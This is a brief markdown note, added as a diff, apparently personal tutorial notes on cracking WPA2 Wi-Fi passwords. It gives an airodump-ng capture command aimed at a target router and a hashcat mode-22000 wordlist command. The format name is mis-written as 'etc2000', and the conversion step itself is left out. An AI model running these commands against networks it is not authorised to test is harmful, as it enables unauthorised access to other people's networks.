@@ -1,0 +1,12 @@
+# Cracking WPA2
+
+## so we'll continue from where we stop
+
+sudo airodump-ng --bssid <router macaddress> --channel <channel number> --write <file name> <interface>
+
+## Once the data is captured convert the file into an etc2000 format so hashcat can crack it .
+
+
+## Note the pc requires a GPU as hashcat requires a GPU to function at it best
+
+hashcat -m 22000 -w 3 110668_ext.hc22000 11charswordlist.txt
